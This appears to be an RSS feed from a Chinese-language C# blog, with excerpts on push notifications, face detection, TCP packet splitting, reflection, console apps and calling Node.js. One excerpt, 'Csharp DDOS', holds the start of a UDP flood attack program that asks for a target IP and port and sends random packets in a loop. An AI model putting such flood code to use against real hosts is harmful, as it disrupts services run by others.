<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>C# on MLOG</title><link>https://qfsyso.github.io/tags/c%23/</link><description>Recent content in C# on MLOG</description><generator>Hugo -- 0.126.3</generator><language>zh-CN</language><lastBuildDate>Mon, 11 Aug 2025 00:10:13 +0800</lastBuildDate><atom:link href="https://qfsyso.github.io/tags/c%23/index.xml" rel="self" type="application/rss+xml"/><item><title>Apple Push Notification System For CSharp</title><link>https://qfsyso.github.io/posts/apple-push-notification-system-for-csharp/</link><pubDate>Mon, 11 Aug 2025 00:10:13 +0800</pubDate><guid>https://qfsyso.github.io/posts/apple-push-notification-system-for-csharp/</guid><description>dotAPNS 通过 Apple Push Notification Service（APNs）发送推送通知的 .NET 库，采用官方推荐的 HTTP/2 API 实现方式。
主要特性
支持 HTTP/2 协议：符合 Apple 官方推荐的推送通知方式，适用于 iOS、macOS、watchOS 等平台。
.NET 支持：兼容 .NET Framework 4.6、.NET Standard 2.0 和 2.1，适用于 ASP.NET Core 项目。
简化集成：提供了 dotAPNS.AspNetCore 集成库，简化了在 ASP.NET Core 项目中的使用。
认证方式：支持基于证书和基于令牌的认证方式，推荐使用令牌方式以避免证书转换的复杂性。
p12 使用 .p12 证书进行推送 dotAPNS 支持使用证书认证方式（.p12 文件）连接 APNs。 以下是使用 .p12 证书发送推送通知的基本步骤：
加载证书： var cert = new X509Certificate2(&amp;#34;path_to_certificate.p12&amp;#34;, &amp;#34;certificate_password&amp;#34;); var apnsClient = ApnsClient.CreateUsingCert(cert); 构建推送通知：
var push = new ApplePush(ApplePushType.Alert) .AddAlert(&amp;#34;title&amp;#34;, &amp;#34;Hello, World!&amp;#34;) .AddToken(&amp;#34;device_token&amp;#34;); 发送通知：</description></item><item><title>Csharp DDOS</title><link>https://qfsyso.github.io/posts/csharp-ddos/</link><pubDate>Wed, 11 Dec 2024 21:19:04 +0000</pubDate><guid>https://qfsyso.github.io/posts/csharp-ddos/</guid><description>UDP 包发 using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class Program { static void Main(string[] args) { Console.Clear(); Console.WriteLine(&amp;#34;UDP Flood Attack&amp;#34;); Console.WriteLine(); // 获取目标 IP 和端口 Console.Write(&amp;#34;IP Target : &amp;#34;); string ip = Console.ReadLine(); Console.Write(&amp;#34;Port : &amp;#34;); int port = int.Parse(Console.ReadLine()); // 准备 UDP 客户端 UdpClient udpClient = new UdpClient(); byte[] bytes = new byte[1490]; new Random().NextBytes(bytes); // 生成随机字节数据 // 模拟进度条 Console.Clear(); Console.WriteLine(&amp;#34;Attack Starting&amp;#34;); ShowProgressBar(); // 开始发送 UDP 数据包 int sent = 0; while (true) { try { udpClient.</description></item><item><title>cashrp opencv</title><link>https://qfsyso.github.io/posts/cashrp-opencv/</link><pubDate>Tue, 03 Dec 2024 01:15:38 +0000</pubDate><guid>https://qfsyso.github.io/posts/cashrp-opencv/</guid><description>Emgu CV进行基本的人脸检测。 人脸检测是指定位图像中的人脸位置，而人脸识别是指确认或验证这些脸孔的身份。为了实现人脸识别，需要训练一个模型，或者使用预训练的模型。
安装 Emgu CV 首先，需要通过NuGet安装Emgu CV包。可以通过Visual Studio的NuGet包管理器来安装：
打开的C#项目。 右键点击解决方案资源管理器中的项目名称，选择“管理NuGet程序包”。
搜索并安装Emgu.CV和Emgu.CV.runtime.windows。 // 加载人脸检测分类器 CascadeClassifier faceCascade = new CascadeClassifier(&amp;#34;haarcascade_frontalface_default.xml&amp;#34;); // 读取输入图像 Image&amp;lt;Bgr, byte&amp;gt; inputImage = new Image&amp;lt;Bgr, byte&amp;gt;(&amp;#34;face.jpg&amp;#34;); // 转换为灰度图像，因为人脸检测通常在灰度图像上进行 Image&amp;lt;Gray, byte&amp;gt; grayImage = inputImage.Convert&amp;lt;Gray, byte&amp;gt;(); // 进行人脸检测 Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty); // 在检测到的人脸周围绘制矩形框 foreach (Rectangle face in faces) { inputImage.Draw(face, new Bgr(0, 255, 0), 3); } // 保存标记后的图像为output.jpg inputImage.Save(&amp;#34;output.jpg&amp;#34;); Console.WriteLine(&amp;#34;save~output.jpg&amp;#34;); xml来自 https://github.com/opencv/opencv/tree/master/data/haarcascades
runtime 如果没有 Emgu.CV.runtime.windows 则会加载不了xml</description></item><item><title>packet splicing</title><link>https://qfsyso.github.io/posts/packet-splicing/</link><pubDate>Wed, 27 Nov 2024 22:46:43 +0000</pubDate><guid>https://qfsyso.github.io/posts/packet-splicing/</guid><description>模拟粘包的场景 粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致读取不完整的数据包时发生。
使用固定分隔符或包头+包体 常见的解决粘包方案是使用分隔符（如 \n 或特殊字符），或采用固定的包头标识数据长度。
服务端代码
using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class TcpServer { static void Main() { TcpListener listener = new TcpListener(IPAddress.Any, 5000); listener.Start(); Console.WriteLine(&amp;#34;Server started, waiting for connection...&amp;#34;); Socket clientSocket = listener.AcceptSocket(); Console.WriteLine(&amp;#34;Client connected!&amp;#34;); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = clientSocket.Receive(buffer)) &amp;gt; 0) { string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine($&amp;#34;Received: {receivedData}&amp;#34;); // 模拟数据未分包的场景 Console.WriteLine(&amp;#34;Processing received data...&amp;#34;); string[] messages = receivedData.</description></item><item><title>csharp reflection delegate</title><link>https://qfsyso.github.io/posts/csharp-reflection-delegate/</link><pubDate>Sun, 24 Nov 2024 17:36:50 +0000</pubDate><guid>https://qfsyso.github.io/posts/csharp-reflection-delegate/</guid><description>Reflection 反射 动态加载和创建对象： 反射可以在运行时加载程序集，并基于类型信息创建对象实例，而无需在编译时知道具体的类型。 这对于实现插件系统、动态加载模块或在不同版本的库之间提供兼容性非常有用。
反射可以获取有关类型（如类、接口、结构体等）及其成员（如字段、属性、方法等）的详细信息。 这对于生成文档、进行代码分析或创建序列化/反序列化机制等任务非常有用。
class Program { static void Main(string[] args) { // 加载包含类型的程序集 Assembly assembly = Assembly.LoadFrom(&amp;#34;ReflectionExample.dll&amp;#34;); // 获取类型信息 Type type = assembly.GetType(&amp;#34;ReflectionExample.MyClass&amp;#34;); // 创建对象实例 object instance = Activator.CreateInstance(type); // 获取方法信息 MethodInfo methodInfo = type.GetMethod(&amp;#34;MyMethod&amp;#34;); // 调用方法 methodInfo.Invoke(instance, new object[] { &amp;#34;Hello, Reflection!&amp;#34; }); } } public class MyClass { public void MyMethod(string message) { Console.WriteLine(message); } } Delegate 委托 委托是一种类型安全的函数指针，可以用来引用一个或多个具有相同签名的方法。 委托（Delegate）是一种特殊的类型，它代表对具有特定参数列表和返回类型的函数的引用。委托可以用来封装静态方法或实例方法，并且可以在运行时像普通变量一样传递。这使得委托成为一种强大的工具，用于实现回调函数、事件处理以及其他需要函数作为参数传递的场景。
委托的基本特性 类型安全：委托是类型安全的，因为它们在声明时会指定一个方法签名，只有与这个签名匹配的方法才能被委托引用。 多播能力：大多数委托支持多播，即一个委托实例可以引用多个方法。当调用该委托时，所有引用的方法都会被依次调用。 灵活性：委托可以用来引用类的实例方法或静态方法，也可以引用匿名方法（使用lambda表达式）。 定义委托 委托可以通过delegate关键字定义。定义时需要指定返回类型和参数列表。 有访问修饰符，delegate，返回值类型，委托名称，参数-可选。可以在类内部，可以在外部。</description></item><item><title>C# keep alive</title><link>https://qfsyso.github.io/posts/c%23-keep-alive/</link><pubDate>Mon, 05 Aug 2024 00:38:00 +0000</pubDate><guid>https://qfsyso.github.io/posts/c%23-keep-alive/</guid><description>在C#中，想让一个控制台应用程序保持运行而不依赖 Cnsole.ReadKey()，可以通过多种方式实现。
1. 使用事件循环 可以使用 EventWaitHandle 或者其他类似的同步原语来创建一个事件循环，让程序保持在等待状态。
using System; using System.Threading; class Program { static void Main() { // 创建一个自动重置的事件对象 EventWaitHandle waitHandle = new EventWaitHandle(false, EventResetMode.AutoReset); Console.WriteLine(&amp;#34;Press any key to exit...&amp;#34;); // 等待事件被设置，如果没有接收到信号，则保持等待状态 waitHandle.WaitOne(); Console.Clear(); } } 使用无限循环 你可以创建一个无限循环，直到你手动终止程序。
//cpu占用高~ using System; class Program { static void Main() { while (true) { // 程序在这里保持运行状态，等待事件或其他中断。 Console.WriteLine(&amp;#34;The program is running. Press CTRL+C to exit.&amp;#34;); } } } 3. 使用定时器 创建一个定时器，定期执行某些任务，或者用于控制程序行为。
using System; using System.</description></item><item><title>c# run nodejs</title><link>https://qfsyso.github.io/posts/c%23-run-nodejs/</link><pubDate>Mon, 20 May 2024 21:13:27 +0000</pubDate><guid>https://qfsyso.github.io/posts/c%23-run-nodejs/</guid><description>在C#中调用Node.js时，一种常见的方法是使用进程间通信（Inter-Process Communication，IPC），例如使用子进程。 可以使用C#中的Process类来启动Node.js进程，并通过标准输入输出与其进行通信。
C# run nodejs // n.js // 监听来自标准输入的消息 process.stdin.on(&amp;#39;data&amp;#39;, function (data) { // 收到消息后，在控制台输出并回复消息 console.log(&amp;#34;Message from C#: &amp;#34; + data.toString()); process.stdout.write(&amp;#34;Hello from Node.js!&amp;#34;); }); ProcessStartInfo startInfo = new ProcessStartInfo(); startInfo.FileName = &amp;#34;node&amp;#34;; // Node.js可执行文件路径，如果已在系统路径中，则不需要提供完整路径 startInfo.Arguments = &amp;#34;n.js&amp;#34;; // 执行的Node.js脚本文件路径 startInfo.UseShellExecute = false; startInfo.RedirectStandardInput = true; startInfo.RedirectStandardOutput = true; Process nodeProcess = new Process(); nodeProcess.StartInfo = startInfo; // 启动进程 nodeProcess.Start(); // 与Node.js进程进行通信 using (var writer = nodeProcess.StandardInput) { if (writer.</description></item></channel></rss>